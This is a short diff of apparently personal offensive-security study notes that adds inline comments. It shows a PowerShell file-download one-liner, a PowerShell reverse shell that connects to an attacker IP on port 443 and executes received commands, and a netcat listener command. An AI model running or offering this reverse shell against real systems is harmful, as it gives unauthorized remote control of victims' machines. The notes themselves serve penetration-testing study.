@@ -390,9 +390,9 @@ C:\Users\offsec> powershell -c "(new-object System.Net.WebClient).DownloadFile('
 Option **-c** - execute the supplied command (wrapped in double-quotes). "new-object" cndlet -  instantiate either a **.Net** Framework or a **COM** object. **WebClient** class - is defined and implemented in the **System.Net** namespace. WebClient exposes public method **DownloadFile**, which requires our two key parameters: a source location, and a target location.
 ### PowerShell Reverse Shells
 ```powershell
-$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);
+$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);  #assign the target IP address
 $stream = $client.GetStream();
-[byte[]]$bytes = 0..65535|%{0};
+[byte[]]$bytes = 0..65535|%{0}; #byte array 
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
 {
     $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
@@ -404,7 +404,7 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
 }
 $client.Close();
 ```
-```console
+```cmd
 #listener - 10.11.0.4
 kali@kali:~$ sudo nc -lnvp 443
 #target
